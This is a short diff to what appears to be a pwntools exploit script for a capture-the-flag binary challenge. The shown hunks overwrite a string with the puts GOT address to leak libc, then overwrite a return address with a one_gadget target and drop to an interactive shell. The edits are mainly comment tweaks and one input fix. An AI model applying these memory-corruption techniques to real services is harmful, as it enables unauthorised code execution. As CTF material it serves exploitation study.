@@ -90,7 +90,7 @@ if args.REMOTE:
 else:
   p = process([exe.path])
 
-# overwrite "Basic Land" string, with puts got address to leak libc address
+# overwrite "Basic Land" string at offset 20, with puts got address to leak libc address
 sla('> ', '2')
 payload = '20 m %p 0 '+str(0x405f60)+' 0\n'
 sla(':\n', payload)
@@ -108,13 +108,13 @@ logbase()
 p.recvuntil('Simplified', drop=True)
 onegadgets = one_gadget(libc.path, libc.address)
 
-# overwrite return address with onegadgets
+# overwrite return address at offset 45 with onegadgets
 sla('> ', '2')
 target = onegadgets[1]
 payload = '45 m '+'\x40\x02\x03'+' 1337 '+str(target & 0xffffffff)+' '+str((target>>32) & 0xffffffff)+'\n'
 sla(':\n', payload)
 # return and get shell
-sla('> ', '5%s')
+sla('> ', '5')
 
 p.interactive()
 ```
